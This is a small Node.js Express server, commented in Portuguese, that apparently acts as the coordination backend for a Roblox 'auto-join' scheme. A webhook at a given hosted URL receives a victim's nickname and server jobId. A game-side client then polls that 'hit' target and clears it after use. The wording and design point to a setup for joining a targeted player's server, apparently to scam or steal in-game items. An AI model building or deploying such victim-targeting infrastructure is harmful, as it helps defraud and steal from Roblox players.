const express = require('express');
const app = express();
app.use(express.json());

// Armazenamento do alvo atual
let currentHit = {
    jobId: null,
    victimNick: null,
    placeId: 142823291
};

// Página inicial para checar se está online
app.get('/', (req, res) => {
    res.send("API do Auto-Join está Online!");
});

// Rota que o Roblox consulta (GET)
app.get('/api/next', (req, res) => {
    res.json(currentHit);
});

// Rota onde você envia o alvo (POST)
// Envie para: https://auto-join-gn6k.onrender.com/webhook
app.post('/webhook', (req, res) => {
    const { jobId, victimNick } = req.body;
    
    if (!jobId || !victimNick) {
        return res.status(400).json({ error: "Envie o jobId e o victimNick no corpo do JSON." });
    }

    currentHit = {
        jobId: jobId,
        victimNick: victimNick,
        placeId: 142823291
    };

    console.log(`[HIT] Alvo definido: ${victimNick} no JobId: ${jobId}`);
    res.json({ message: "Alvo atualizado com sucesso!", alvo: currentHit });
});

// Rota para limpar o alvo após o uso
app.get('/api/clear', (req, res) => {
    currentHit = { jobId: null, victimNick: null, placeId: 142823291 };
    res.send("API limpa. Aguardando novo hit.");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});
